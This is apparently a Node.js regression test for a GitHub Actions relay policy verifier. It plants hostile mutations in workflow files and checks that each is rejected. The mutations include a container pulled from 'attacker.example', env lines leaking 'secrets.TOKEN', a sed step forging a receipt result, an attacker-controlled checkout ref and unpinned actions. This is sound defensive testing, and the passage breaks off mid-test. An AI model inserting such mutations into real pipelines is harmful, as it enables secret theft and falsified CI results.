import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { spawnSync } from 'node:child_process';
import { runInNewContext } from 'node:vm';

const invocationRoot = process.cwd();
const baseRootIndex = process.argv.indexOf('--base-root');
if ((baseRootIndex >= 0 && process.argv[baseRootIndex + 1] === undefined) ||
    process.argv.some((argument, index) =>
      index >= 2 && index !== baseRootIndex && index !== baseRootIndex + 1)) {
  throw new Error('Usage: node scripts/test-policy.mjs [--base-root PATH]');
}
const requestedBaseRoot = baseRootIndex >= 0
  ? process.argv[baseRootIndex + 1]
  : invocationRoot;
const sourceRoot = fs.realpathSync(path.resolve(invocationRoot, requestedBaseRoot));
const fixtureRoots = [];
let regressionCount = 0;
let acceptanceCount = 0;
let receiptRuntimeCount = 0;

// Execute the actual inline builder with synthetic environment values and an
// in-memory filesystem. No GitHub calls, writes, or target code are permitted.
const receiptWorkflow = fs.readFileSync(
  path.join(sourceRoot, '.github/workflows/relay-process-environment.yml'),
  'utf8',
);
const receiptMarker = '        name: Build canonical receipt from trusted job results';
const receiptStepStart = receiptWorkflow.indexOf(receiptMarker);
assert(receiptStepStart >= 0, 'canonical receipt step must exist');
assert.equal(receiptWorkflow.indexOf(receiptMarker, receiptStepStart + 1), -1);
const receiptScriptStart = receiptWorkflow.indexOf(
  "          const fs = require('fs');", receiptStepStart,
);
const receiptScriptEnd = receiptWorkflow.indexOf('\n          NODE', receiptScriptStart);
assert(receiptScriptStart > receiptStepStart && receiptScriptEnd > receiptScriptStart);
const receiptBuilder = receiptWorkflow.slice(receiptScriptStart, receiptScriptEnd)
  .replace(/^ {10}/gmu, '');
const syntheticWorkflowRef =
  'synthetic/relay/.github/workflows/relay-process-environment.yml@refs/heads/main';
const syntheticReceiptEnvironment = {
  TARGET_PROFILE_FAMILY: 'python',
  RELAY_EVENT_NAME: 'workflow_dispatch',
  TARGET_RUNTIME_JSON: '{"python_versions":["3.12.14"],"node_version":null}',
  PYTHON_DISPATCH_RESULT: 'success',
  POSIX_RESULT: 'skipped',
  WINDOWS_RESULT: 'skipped',
  PREPARE_REGRESSION_RESULT: 'skipped',
  PYTHON_REGRESSION_RESULT: 'skipped',
  TARGET_REPOSITORY_ID: '123',
  TARGET_REPO: 'synthetic/public',
  TARGET_SHA: 'a'.repeat(40),
  TARGET_PROFILE: 'synthetic-profile',
  RELAY_REPOSITORY: 'synthetic/relay',
  RELAY_WORKFLOW_REF: syntheticWorkflowRef,
  RELAY_WORKFLOW_SHA: 'b'.repeat(40),
  RELAY_EVENT_SHA: 'b'.repeat(40),
  DEFINING_WORKFLOW_REPOSITORY: 'synthetic/relay',
  DEFINING_WORKFLOW_FILE_PATH: '.github/workflows/relay-process-environment.yml',
  DEFINING_WORKFLOW_REF: syntheticWorkflowRef,
  DEFINING_WORKFLOW_SHA: 'b'.repeat(40),
  RUN_ID: '123',
  RUN_ATTEMPT: '1',
  RELAY_ACTOR: 'synthetic-human',
  LEAD_PROVIDER: 'synthetic',
  receipt_file: 'synthetic-output',
  PRIVATE_TRACE_CANARY: 'synthetic-private-marker-must-not-leak',
};
const exerciseReceipt = (overrides = {}, expectedError = null) => {
  receiptRuntimeCount += 1;
  const writes = [];
  const run = () => runInNewContext(receiptBuilder, {
    require(specifier) {
      assert.equal(specifier, 'fs');
      return {
        writeFileSync(file, content) {
          assert.equal(file, 'synthetic-output');
          writes.push(JSON.parse(content));
        },
      };
    },
    process: { env: { ...syntheticReceiptEnvironment, ...overrides } },
  }, { timeout: 1000 });
  if (expectedError) {
    assert.throws(run, expectedError);
    assert.equal(writes.length, 0, 'invalid receipt must fail before any output');
    return null;
  }
  run();
  assert.equal(writes.length, 1, 'exactly one receipt must be produced');
  assert(!JSON.stringify(writes[0]).includes('synthetic-private-marker-must-not-leak'));
  return writes[0];
};

const createFixture = () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'organvm-relay-policy-'));
  fixtureRoots.push(root);
  for (const directory of ['.github', 'config', 'profiles']) {
    fs.cpSync(path.join(sourceRoot, directory), path.join(root, directory), {
      recursive: true,
    });
  }
  fs.mkdirSync(path.join(root, 'scripts'));
  for (const file of ['verify-policy.mjs', 'test-policy.mjs']) {
    fs.copyFileSync(
      path.join(sourceRoot, 'scripts', file),
      path.join(root, 'scripts', file),
    );
  }
  fs.copyFileSync(path.join(sourceRoot, 'relay'), path.join(root, 'relay'));
  fs.chmodSync(path.join(root, 'relay'), fs.statSync(path.join(sourceRoot, 'relay')).mode);
  return root;
};

const runVerifier = (root, trustedRoot = sourceRoot) => spawnSync(
  process.execPath,
  [
    path.join(sourceRoot, 'scripts', 'verify-policy.mjs'),
    '--candidate-root',
    root,
    '--base-root',
    trustedRoot,
  ],
  { cwd: sourceRoot, encoding: 'utf8' },
);

const replace = (root, relativePath, from, to) => {
  const file = path.join(root, relativePath);
  const source = fs.readFileSync(file, 'utf8');
  assert.ok(source.includes(from), `fixture marker missing in ${relativePath}`);
  fs.writeFileSync(file, source.replace(from, to));
};

const mutateRegistry = (root, mutate) => {
  const file = path.join(root, 'config', 'targets.json');
  const registry = JSON.parse(fs.readFileSync(file, 'utf8'));
  mutate(registry);
  fs.writeFileSync(file, `${JSON.stringify(registry, null, 2)}\n`);
};

const replaceInJob = (root, jobId, from, to) => {
  const relativePath = '.github/workflows/relay-process-environment.yml';
  const file = path.join(root, relativePath);
  const source = fs.readFileSync(file, 'utf8');
  const startMarker = `  ${jobId}:\n`;
  const start = source.indexOf(startMarker);
  assert.notEqual(start, -1, `job ${jobId} is missing`);
  const following = source.slice(start + startMarker.length);
  const nextJob = following.search(/^  [A-Za-z_][A-Za-z0-9_-]*:\s*$/m);
  const end = nextJob < 0
    ? source.length
    : start + startMarker.length + nextJob;
  const job = source.slice(start, end);
  assert.ok(job.includes(from), `fixture marker missing in job ${jobId}`);
  fs.writeFileSync(file, source.slice(0, start) + job.replace(from, to) + source.slice(end));
};

const expectRejected = (name, mutate, expectedDiagnostic) => {
  regressionCount += 1;
  const root = createFixture();
  mutate(root);
  const result = runVerifier(root);
  assert.notEqual(
    result.status,
    0,
    `${name} unexpectedly passed\n${result.stdout}\n${result.stderr}`,
  );
  assert.ok(expectedDiagnostic instanceof RegExp, `${name} needs an expected diagnostic`);
  assert.match(
    result.stderr,
    expectedDiagnostic,
    `${name} failed for the wrong reason\n${result.stdout}\n${result.stderr}`,
  );
};

const expectAccepted = (name, mutate) => {
  acceptanceCount += 1;
  const root = createFixture();
  mutate(root);
  const result = runVerifier(root);
  assert.equal(
    result.status,
    0,
    `${name} unexpectedly failed\n${result.stdout}\n${result.stderr}`,
  );
};

const expectSelfRejected = (name, mutate, expectedDiagnostic) => {
  regressionCount += 1;
  const root = createFixture();
  mutate(root);
  const result = runVerifier(root, root);
  assert.notEqual(
    result.status,
    0,
    `${name} unexpectedly passed\n${result.stdout}\n${result.stderr}`,
  );
  assert.match(
    result.stderr,
    expectedDiagnostic,
    `${name} failed for the wrong reason\n${result.stdout}\n${result.stderr}`,
  );
};

const extractLiteralRunBlock = (source, stepName) => {
  const lines = source.split('\n');
  const step = lines.findIndex((line) => line === `      - name: ${stepName}`);
  assert.notEqual(step, -1, `workflow step is missing: ${stepName}`);
  const followingStep = lines.findIndex(
    (line, index) => index > step && line.startsWith('      - '),
  );
  const stepEnd = followingStep < 0 ? lines.length : followingStep;
  const run = lines.findIndex(
    (line, index) => index > step && index < stepEnd && line === '        run: |',
  );
  assert.notEqual(run, -1, `literal run block is missing: ${stepName}`);
  const body = [];
  for (let index = run + 1; index < lines.length; index += 1) {
    if (lines[index].startsWith('      - name: ')) break;
    if (lines[index] === '') {
      body.push('');
      continue;
    }
    assert.ok(lines[index].startsWith('          '), `invalid run indentation: ${stepName}`);
    body.push(lines[index].slice(10));
  }
  return `${body.join('\n')}\n`;
};

try {
  const validReceipt = exerciseReceipt();
  assert.equal(validReceipt.schema, 'organvm-ci-relay-receipt/v3');
  assert.equal(validReceipt.evidence_origin, 'personal-account-relay-execution');
  assert.equal(validReceipt.aggregate, 'success');
  assert.equal(validReceipt.aggregate_scope, 'target-execution-and-required-regressions');
  assert.equal(validReceipt.source_checkout_verified, true);
  assert.equal(validReceipt.tests_and_assertions_executed, true);
  assert.equal(validReceipt.publication.durable_ledger, 'not-yet-observed');
  assert.equal(validReceipt.publication.artifact_upload, 'not-yet-observed');
  for (const field of [
    'RELAY_REPOSITORY', 'RELAY_WORKFLOW_REF', 'RELAY_WORKFLOW_SHA', 'RELAY_EVENT_SHA',
    'DEFINING_WORKFLOW_REPOSITORY', 'DEFINING_WORKFLOW_FILE_PATH',
    'DEFINING_WORKFLOW_REF', 'DEFINING_WORKFLOW_SHA',
  ]) {
    for (const value of ['', undefined, 'mismatched-identity']) {
      exerciseReceipt({ [field]: value }, /Receipt workflow identity is missing or inconsistent/u);
    }
  }
  exerciseReceipt({
    RELAY_WORKFLOW_REF: syntheticWorkflowRef.replace('main', 'unreviewed'),
    DEFINING_WORKFLOW_REF: syntheticWorkflowRef.replace('main', 'unreviewed'),
  }, /Receipt workflow identity is missing or inconsistent/u);
  exerciseReceipt({
    RELAY_WORKFLOW_SHA: 'B'.repeat(40), RELAY_EVENT_SHA: 'B'.repeat(40),
    DEFINING_WORKFLOW_SHA: 'B'.repeat(40),
  }, /Receipt workflow identity is missing or inconsistent/u);
  for (const overrides of [
    { DEFINING_WORKFLOW_SHA: 'c'.repeat(40) },
    { RELAY_EVENT_SHA: 'c'.repeat(40) },
    { DEFINING_WORKFLOW_REPOSITORY: 'synthetic/different-relay' },
    { DEFINING_WORKFLOW_FILE_PATH: '.github/workflows/different.yml' },
  ]) {
    exerciseReceipt(overrides, /Receipt workflow identity is missing or inconsistent/u);
  }
  for (const status of ['failure', 'cancelled', 'skipped', 'unknown']) {
    const failedReceipt = exerciseReceipt({ PYTHON_DISPATCH_RESULT: status });
    assert.equal(failedReceipt.aggregate, 'error');
    assert.equal(failedReceipt.source_checkout_verified, null);
    assert.equal(failedReceipt.tests_and_assertions_executed, null);
    assert.equal(failedReceipt.publication.durable_ledger, 'not-yet-observed');
  }
  const pushReceipt = exerciseReceipt({
    RELAY_EVENT_NAME: 'push', PREPARE_REGRESSION_RESULT: 'success',
    PYTHON_REGRESSION_RESULT: 'success',
    REGRESSION_MATRIX_JSON: JSON.stringify({ include: [{ sha: 'a'.repeat(40) }] }),
  });
  assert.equal(pushReceipt.aggregate, 'success');
  const failedRegressions = exerciseReceipt({ RELAY_EVENT_NAME: 'push' });
  assert.equal(failedRegressions.aggregate, 'error');
  assert.equal(failedRegressions.tests_and_assertions_executed, null);
  const posixReceipt = exerciseReceipt({
    TARGET_PROFILE_FAMILY: 'process-environment', POSIX_RESULT: 'success', WINDOWS_RESULT: 'success',
  });
  assert.equal(posixReceipt.aggregate, 'success');
  exerciseReceipt({ TARGET_PROFILE_FAMILY: 'unknown' }, /Unknown profile family/u);
  const publicationSpoof = exerciseReceipt({ PUBLICATION_RESULT: 'success' });
  assert.equal(publicationSpoof.publication.durable_ledger, 'not-yet-observed');

  const baseline = runVerifier(createFixture());
  assert.equal(
    baseline.status,
    0,
    `baseline failed\n${baseline.stdout}\n${baseline.stderr}`,
  );
  const readme = fs.readFileSync(path.join(sourceRoot, 'README.md'), 'utf8');
  assert.match(
    readme,
    /both Python jobs use the pinned\s+`actions\/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97`/u,
    'README must identify the pinned Python setup action',
  );
  assert.match(
    readme,
    /Candidate-head attachment is therefore not an activation\s+blocker/u,
    'README must record the observed candidate-head attachment',
  );
  assert.match(
    readme,
    /duplicate-context\s+resolution is GitHub platform behavior/u,
    'README must retain the proven duplicate-context warning',
  );
  const policySource = fs.readFileSync(
    path.join(sourceRoot, '.github', 'workflows', 'relay-policy.yml'),
    'utf8',
  );
  const operationalShell = extractLiteralRunBlock(
    policySource,
    'Verify every registered operational SHA exists',
  );
  const operationalSyntax = spawnSync('bash', ['-n'], {
    input: operationalShell,
    encoding: 'utf8',
  });
  assert.equal(
    operationalSyntax.status,
    0,
    `operational admission shell is invalid\n${operationalSyntax.stderr}`,
  );
  regressionCount += 1;
  const malformedOperationalShell = operationalShell.replaceAll(
    "\nNODE\n)",
    "\n  NODE\n)",
  );
  assert.notEqual(malformedOperationalShell, operationalShell);
  const malformedSyntax = spawnSync('bash', ['-n'], {
    input: malformedOperationalShell,
    encoding: 'utf8',
  });
  assert.notEqual(malformedSyntax.status, 0, 'misaligned admission heredoc unexpectedly parsed');

  for (const attributePath of [
    '.gitattributes',
    '.github/.gitattributes',
    'config/.gitattributes',
    'scripts/.gitattributes',
  ]) {
    expectRejected(`trust-root push filter retains ${attributePath}`, (root) => {
      replace(
        root,
        '.github/workflows/relay-process-environment.yml',
        `      - "${attributePath}"\n`,
        '',
      );
    }, new RegExp(
      `Missing trust-boundary command: - "${attributePath.replaceAll('.', '\\.') }"`,
      'u',
    ));
  }
  expectRejected('trust-root push paths reject a decoy attribute entry', (root) => {
    replace(
      root,
      '.github/workflows/relay-process-environment.yml',
      '      - ".gitattributes"\n',
      '',
    );
    replaceInJob(
      root,
      'posix',
      '            target/posix-output.sha256',
      '            target/posix-output.sha256\n' +
        '            - ".gitattributes"',
    );
  }, /Relay trust-root push paths changed/u);

  expectRejected('trusted policy fetch block rejects appended execution', (root) => {
    replace(
      root,
      '.github/workflows/relay-policy.yml',
      '          set -euo pipefail\n          [[ "$BASE_REPOSITORY"',
      '          set -euo pipefail\n          echo unauthorized\n          [[ "$BASE_REPOSITORY"',
    );
  }, /trusted pull-request fetch and freeze commands changed/u);

  expectRejected('policy trigger lines cannot hide in a block scalar', (root) => {
    replace(
      root,
      '.github/workflows/relay-policy.yml',
      '  pull_request_target:\n' +
        '    branches: [main]\n' +
        '    types: [opened, reopened, synchronize, ready_for_review, edited]\n',
      '',
    );
    replace(
      root,
      '.github/workflows/relay-policy.yml',
      '\npermissions:\n',
      '\nrun-name: |\n' +
        '  pull_request_target:\n' +
        '    branches: [main]\n' +
        '    types: [opened, reopened, synchronize, ready_for_review, edited]\n' +
        '\npermissions:\n',
    );
  }, /Relay policy trigger allowlist changed/u);

  expectRejected('policy candidate verification cannot suppress failure', (root) => {
    replace(
      root,
      '.github/workflows/relay-policy.yml',
      '      - name: Verify the candidate with the trusted base verifier\n' +
        '        shell: bash',
      '      - name: Verify the candidate with the trusted base verifier\n' +
        '        continue-on-error: true\n' +
        '        shell: bash',
    );
  }, /trusted candidate-verification step must run unconditionally and fail closed/u);

  expectSelfRejected('policy timeout covers bounded live admission', (root) => {
    replace(
      root,
      '.github/workflows/relay-policy.yml',
      '    timeout-minutes: 15\n',
      '    timeout-minutes: 5\n',
    );
  }, /Relay policy job timeout changed/u);

  for (const [label, injected] of [
    ['condition', '        if: false\n'],
    ['failure suppression', '        continue-on-error: true\n'],
  ]) {
    expectRejected(`policy regression step rejects ${label}`, (root) => {
      replace(
        root,
        '.github/workflows/relay-policy.yml',
        '      - name: Regress the trusted base verifier\n' +
          '        shell: bash',
        '      - name: Regress the trusted base verifier\n' +
          injected +
          '        shell: bash',
      );
    }, /trusted policy-regression step must run unconditionally and fail closed/u);
  }

  expectSelfRejected('operational SHA gate cannot be disabled', (root) => {
    replace(
      root,
      '.github/workflows/relay-policy.yml',
      "      - name: Verify every registered operational SHA exists\n" +
        "        if: github.event_name == 'pull_request_target'",
      '      - name: Verify every registered operational SHA exists\n' +
        '        if: false',
    );
  }, /operational SHA existence gate changed/u);

  expectSelfRejected('operational SHA gate requires commit objects', (root) => {
    replace(
      root,
      '.github/workflows/relay-policy.yml',
      '            [[ "$(git -C "$directory" cat-file -t FETCH_HEAD)" == commit ]]\n',
      '',
    );
  }, /operational SHA existence gate changed/u);

  expectSelfRejected('operational SHA gate binds live repository IDs', (root) => {
    replace(
      root,
      '.github/workflows/relay-policy.yml',
      '                  String(live.full_name).toLowerCase() !== repository.toLowerCase() ||\n',
      '',
    );
  }, /operational SHA existence gate changed/u);

  expectRejected('execution workflow rejects added triggers', (root) => {
    replace(
      root,
      '.github/workflows/relay-process-environment.yml',
      'on:\n  push:',
      'on:\n  pull_request:\n  push:',
    );
  }, /Relay execution trigger allowlist changed/u);

  expectRejected('execution workflow rejects tagged trigger keys', (root) => {
    replace(
      root,
      '.github/workflows/relay-process-environment.yml',
      'on:\n  push:',
      'on:\n  !!str pull_request:\n  push:',
    );
  }, /Explicit YAML tags are forbidden/u);

  expectRejected('execution workflow rejects local-tagged trigger keys', (root) => {
    replace(
      root,
      '.github/workflows/relay-process-environment.yml',
      'on:\n  push:',
      'on:\n  !trigger pull_request:\n  push:',
    );
  }, /Explicit YAML tags are forbidden/u);

  expectRejected('execution workflow rejects bare-tagged trigger keys', (root) => {
    replace(
      root,
      '.github/workflows/relay-process-environment.yml',
      'on:\n  push:',
      'on:\n  ! pull_request:\n  push:',
    );
  }, /Explicit YAML tags are forbidden/u);

  expectRejected('workflow jobs cannot use self-hosted runners', (root) => {
    replaceInJob(
      root,
      'windows',
      '    runs-on: windows-latest',
      '    runs-on: self-hosted',
    );
  }, /Workflow job must use its reviewed GitHub-hosted runner/u);

  expectRejected('POSIX matrix cannot add a self-hosted runner', (root) => {
    replaceInJob(
      root,
      'posix',
      '          - os: macos-latest\n' +
        '            receipt_label: macos',
      '          - os: macos-latest\n' +
        '            receipt_label: macos\n' +
        '          - os: self-hosted\n' +
        '            receipt_label: persistent',
    );
  }, /POSIX jobs must use only the reviewed GitHub-hosted runner matrix/u);

  expectRejected('execution jobs cannot suppress failure', (root) => {
    replaceInJob(
      root,
      'python_dispatch',
      '    timeout-minutes: 35',
      '    timeout-minutes: 35\n    continue-on-error: true',
    );
  }, /Workflow jobs may not suppress failures/u);

  expectRejected('execution job cannot declare a container', (root) => {
    replaceInJob(
      root,
      'python_dispatch',
      '    runs-on: ubuntu-latest',
      '    runs-on: ubuntu-latest\n' +
        '    container: attacker.example/relay:latest',
    );
  }, /Workflow jobs may not declare containers/u);

  expectRejected('receipt job cannot be disabled', (root) => {
    replaceInJob(
      root,
      'receipt',
      "    if: always() && needs.authorize.result == 'success'",
      '    if: false',
    );
  }, /Receipt job execution guard or dependencies changed/u);

  expectRejected('authorization checkout cannot select another ref', (root) => {
    replaceInJob(
      root,
      'authorize',
      '          ref: ${{ github.sha }}',
      '          ref: attacker-controlled',
    );
  }, /Authorization checkout inputs must bind to the event SHA/u);

  for (const [jobId, binding, expected] of [
    ['posix', 'TARGET_REPO', '${{ needs.authorize.outputs.full_name }}'],
    ['posix', 'TARGET_SHA', '${{ needs.authorize.outputs.sha }}'],
    ['posix', 'RELAY_SHA', '${{ needs.authorize.outputs.relay_sha }}'],
    ['posix', 'TARGET_PROFILE', '${{ needs.authorize.outputs.profile }}'],
    ['windows', 'TARGET_PROFILE', '${{ needs.authorize.outputs.profile }}'],
    ['python_dispatch', 'TARGET_PROFILE', '${{ needs.authorize.outputs.profile }}'],
    ['python_regression', 'TARGET_PROFILE', '${{ matrix.profile }}'],
  ]) {
    expectRejected(`${jobId} binds ${binding} to trusted output`, (root) => {
      replaceInJob(
        root,
        jobId,
        `      ${binding}: ${expected}`,
        `      ${binding}: bypass-value`,
      );
    }, new RegExp(`Execution job environment changed: ${jobId}`, 'u'));
  }

  expectRejected('receipt dependencies cannot omit regressions', (root) => {
    replaceInJob(
      root,
      'receipt',
      '    needs: [authorize, posix, windows, python_dispatch, prepare_regression, python_regression]',
      '    needs: [authorize, posix, windows, python_dispatch, prepare_regression]',
    );
  }, /Receipt job execution guard or dependencies changed/u);

  expectRejected('durable receipt push cannot be disabled', (root) => {
    replaceInJob(
      root,
      'receipt',
      '      - name: Commit the durable receipt\n' +
        '        shell: bash',
      '      - name: Commit the durable receipt\n' +
        '        if: false\n' +
        '        shell: bash',
    );
  }, /durable receipt push step must run unconditionally and fail closed/u);

  expectSelfRejected('receipt job rejects an extra forgery command', (root) => {
    replaceInJob(
      root,
      'receipt',
      '      - name: Upload canonical receipt pair',
      '      - name: Forge canonical receipt\n' +
        '        shell: bash\n' +
        '        run: sed -i \'s/"aggregate": "error"/"aggregate": "success"/\' ' +
          '"$RECEIPT_FILE"\n' +
        '\n' +
        '      - name: Upload canonical receipt pair',
    );
  }, /complete write-enabled receipt job changed/u);

  expectRejected('Python dispatch matrix cannot exclude an authorized runtime', (root) => {
    replaceInJob(
      root,
      'python_dispatch',
      '      matrix:\n' +
        '        python-version: ${{ fromJSON(needs.authorize.outputs.python_versions) }}',
      '      matrix:\n' +
        '        python-version: ${{ fromJSON(needs.authorize.outputs.python_versions) }}\n' +
        '        exclude:\n' +
        '          - python-version: "3.12.14"',
    );
  }, /python_dispatch matrix must contain only the authorized Python version axis/u);

  expectRejected('indexed secrets context', (root) => {
    replace(
      root,
      '.github/workflows/relay-process-environment.yml',
      'jobs:\n',
      "env:\n  LEAK: ${{ secrets['TOKEN'] }}\njobs:\n",
    );
  }, /may not reference the GitHub secrets context/u);

  expectRejected('dotted secrets context', (root) => {
    replace(
      root,
      '.github/workflows/relay-process-environment.yml',
      'jobs:\n',
      'env:\n  LEAK: ${{ secrets.TOKEN }}\njobs:\n',
    );
  }, /may not reference the GitHub secrets context/u);

  expectRejected('top-level write permission', (root) => {
    replace(
      root,
      '.github/workflows/relay-process-environment.yml',
      'permissions: {}',
      'permissions:\n  contents: write',
    );
  }, /relay workflow must default to zero permissions/u);

  expectRejected('floating Git SSH dependency in PowerShell', (root) => {
    const file = path.join(
      root,
      'profiles',
      'process-environment-enactment-v1.ps1',
    );
    fs.appendFileSync(
      file,
      "\n$Dependency = 'pkg @ git+ssh://git@github.com/example/pkg.git@main'\n",
    );
  }, /Unpinned or unsupported Git dependency/u);

  expectRejected('floating external action', (root) => {
    replace(
      root,
      '.github/workflows/relay-policy.yml',
      'actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1',
      'actions/checkout@main',
    );
  }, /External action is not pinned to a full SHA/u);

  expectRejected('policy overlay drops complete workflow-tree freeze', (root) => {
    replace(
      root,
      '.github/workflows/relay-policy.yml',
      '            .github/workflows\n            .github/workflows/relay-policy.yml',
      '            .github/workflows/relay-policy.yml',
    );
  }, /Missing base-anchored policy command: \.github\/workflows/u);

  expectRejected('policy overlay drops launcher trust-path freeze', (root) => {
    replace(
      root,
      '.github/workflows/relay-policy.yml',
      '            relay\n            profiles',
      '            profiles',
    );
  }, /Missing base-anchored policy command: relay/u);

  expectRejected('policy overlay drops governing Git-attributes freeze', (root) => {
    replace(
      root,
      '.github/workflows/relay-policy.yml',
      '            .gitattributes\n            .github/.gitattributes',
      '            .github/.gitattributes',
    );
  }, /Missing base-anchored policy command: \.gitattributes/u);

  expectRejected('quoted floating external action', (root) => {
    replace(
      root,
      '.github/workflows/relay-policy.yml',
      'uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7',
      'uses: "actions/checkout@main" # floating',
    );
  }, /External action is not pinned to a full SHA/u);

  expectRejected('setup-node exact SHA is immutable', (root) => {
    replaceInJob(
      root,
      'python_dispatch',
      'actions/setup-node@820762786026740c76f36085b0efc47a31fe5020',
      'actions/setup-node@1111111111111111111111111111111111111111',
    );
  }, /Workflow action allowlist changed|Unexpected action list for python_dispatch/u);

  expectRejected('setup-node package-manager cache stays disabled', (root) => {
    replaceInJob(
      root,
      'python_dispatch',
      '          package-manager-cache: false',
      '          package-manager-cache: true',
    );
  }, /python_dispatch.*(?:Node|runtime)|(?:Node|runtime).*python_dispatch/iu);

  expectRejected('setup-node dispatch condition stays profile-derived', (root) => {
    replaceInJob(
      root,
      'python_dispatch',
      "        if: needs.authorize.outputs.node_version != ''",
      '        if: always()',
    );
  }, /python_dispatch.*(?:Node|runtime)|(?:Node|runtime).*python_dispatch/iu);

  expectRejected('setup-node regression condition stays matrix-derived', (root) => {
    replaceInJob(
      root,
      'python_regression',
      "        if: matrix.node_version != ''",
      '        if: always()',
    );
  }, /python_regression.*(?:Node|runtime)|(?:Node|runtime).*python_regression/iu);

  expectRejected('uppercase action SHA', (root) => {
    replace(
      root,
      '.github/workflows/relay-policy.yml',
      '3d3c42e5aac5ba805825da76410c181273ba90b1',
      '3D3C42E5AAC5BA805825DA76410C181273BA90B1',
    );
  }, /External action is not pinned to a full SHA/u);

  expectRejected('additional workflow', (root) => {
    fs.writeFileSync(
      path.join(root, '.github', 'workflows', 'unreviewed.yml'),
      'name: unreviewed\non: push\njobs: {}\n',
    );
  }, /Unexpected workflow set/u);

  expectRejected('main-branch receipt push', (root) => {
    replace(
      root,
      '.github/workflows/relay-process-environment.yml',
      'git -C ledger push origin HEAD:receipts',
      'git -C ledger push origin HEAD:refs/heads/main',
    );
  }, /receipt push must be the only Git push command/u);

  expectRejected('receipt checkout changed behind a comment', (root) => {
    replace(
      root,
      '.github/workflows/relay-process-environment.yml',
      'ref: receipts',
      'ref: main # ref: receipts',
    );
  }, /receipts ref must be bound to the isolated ledger checkout/u);

  expectRejected('missing branch-relative checksum verification', (root) => {
    replace(
      root,
      '.github/workflows/relay-process-environment.yml',
      'sha256sum -c "$relative_receipt.sha256"',
      'true # checksum verification removed',
    );
  }, /Missing trust-boundary command/u);

  expectRejected('cancellable trust-root push', (root) => {
    replace(
      root,
      '.github/workflows/relay-process-environment.yml',
      "cancel-in-progress: ${{ github.event_name != 'push' }}",
      'cancel-in-progress: true',
    );
  }, /Missing trust-boundary command/u);

  expectRejected('workflow dispatch fallback bypasses canary resolver', (root) => {
    replace(
      root,
      '.github/workflows/relay-process-environment.yml',
      'TARGET_REPO: ${{ steps.resolve.outputs.target }}',
      "TARGET_REPO: ${{ inputs.target || 'example/bypass' }}",
    );
  }, /Missing trust-boundary command: TARGET_REPO/u);

  expectRejected('workflow dispatch target default is not explicit', (root) => {
    replace(
      root,
      '.github/workflows/relay-process-environment.yml',
      '        required: true\n        type: string',
      '        required: true\n        default: example/bypass\n        type: string',
    );
  }, /Workflow dispatch inputs must be explicit and have no defaults/u);

  expectRejected('reusable workflow inherits secrets', (root) => {
    replace(
      root,
      '.github/workflows/relay-process-environment.yml',
      '  receipt:\n',
      '  reusable_secret_call:\n' +
        '    uses: example/relay/.github/workflows/reusable.yml@' +
        '1111111111111111111111111111111111111111\n' +
        "    'secrets' : inherit\n" +
        '  receipt:\n',
    );
  }, /Workflow may not declare or pass secrets/u);

  expectRejected('reusable workflow passes a secrets mapping', (root) => {
    replace(
      root,
      '.github/workflows/relay-process-environment.yml',
      '  receipt:\n',
      '  reusable_secret_call:\n' +
        '    uses: example/relay/.github/workflows/reusable.yml@' +
        '2222222222222222222222222222222222222222\n' +
        '    secrets:\n' +
        '      TOKEN: literal\n' +
        '  receipt:\n',
    );
  }, /Workflow may not declare or pass secrets/u);

  expectRejected('explicit reusable-workflow secrets key', (root) => {
    replace(
      root,
      '.github/workflows/relay-process-environment.yml',
      '  receipt:\n',
      '  reusable_secret_call:\n' +
        '    uses: example/relay/.github/workflows/reusable.yml@' +
        '3333333333333333333333333333333333333333\n' +
        '    ? secrets\n' +
        '    : inherit\n' +
        '  receipt:\n',
    );
  }, /Explicit YAML mapping keys are not allowed/u);

  expectRejected('inline quoted write permission', (root) => {
    replaceInJob(
      root,
      'python_dispatch',
      '    permissions: {}\n',
      '    permissions: {contents: "write"}\n',
    );
  }, /Only the isolated receipt job may receive one contents: write grant/u);

  expectRejected('quoted key and value write permission', (root) => {
    replaceInJob(
      root,
      'python_regression',
      '    permissions: {}\n',
      '    "permissions" :\n' +
        "      'issues' : 'write'\n",
    );
  }, /Only the isolated receipt job may receive one contents: write grant/u);

  expectRejected('quoted write-all permission', (root) => {
    replace(
      root,
      '.github/workflows/relay-policy.yml',
      'permissions:\n  contents: read',
      'permissions: "write-all"',
    );
  }, /may not grant write-all permissions/u);

  expectRejected('spaced uses colon with floating action', (root) => {
    replace(
      root,
      '.github/workflows/relay-policy.yml',
      'uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7',
      'uses : actions/checkout@main',
    );
  }, /External action is not pinned to a full SHA/u);

  expectRejected('Git global options before profile fetch', (root) => {
    fs.appendFileSync(
      path.join(root, 'profiles', 'python-ruff-pytest-v1.sh'),
      '\ngit --no-pager -C . -c protocol.version=2 fetch origin main\n',
    );
  }, /Raw Git network command/u);

  expectSelfRejected('reviewed profile digest rejects escaped Git executable', (root) => {
    fs.appendFileSync(
      path.join(root, 'profiles', 'python-ruff-pytest-v1.sh'),
      '\ng\\it clone https://github.com/example/repo.git\n',
    );
  }, /Reviewed profile digest changed/u);

  expectRejected('YAML permission anchor', (root) => {
    replace(
      root,
      '.github/workflows/relay-policy.yml',
      'permissions:\n  contents: read',
      'permissions: &policy_permissions\n  contents: read',
    );
  }, /YAML anchors, aliases, and merge keys are not allowed/u);

  expectRejected('numeric YAML anchor', (root) => {
    replaceInJob(
      root,
      'python_dispatch',
      '    env:\n',
      '    env: &1\n',
    );
  }, /YAML anchors, aliases, and merge keys are not allowed/u);

  expectRejected('numeric YAML alias', (root) => {
    replaceInJob(
      root,
      'python_dispatch',
      '    permissions: {}\n',
      '    permissions: *1\n',
    );
  }, /YAML anchors, aliases, and merge keys are not allowed/u);

  expectRejected('YAML job merge alias', (root) => {
    replaceInJob(
      root,
      'posix',
      '    name: POSIX / ${{ matrix.os }}\n',
      '    name: POSIX / ${{ matrix.os }}\n' +
        '    <<: *shared_job\n',
    );
  }, /YAML anchors, aliases, and merge keys are not allowed/u);

  expectRejected('duplicate direct step run key', (root) => {
    replace(
      root,
      '.github/workflows/relay-policy.yml',
      '        run: node trusted/scripts/verify-policy.mjs --candidate-root "$CANDIDATE_ROOT" --base-root trusted',
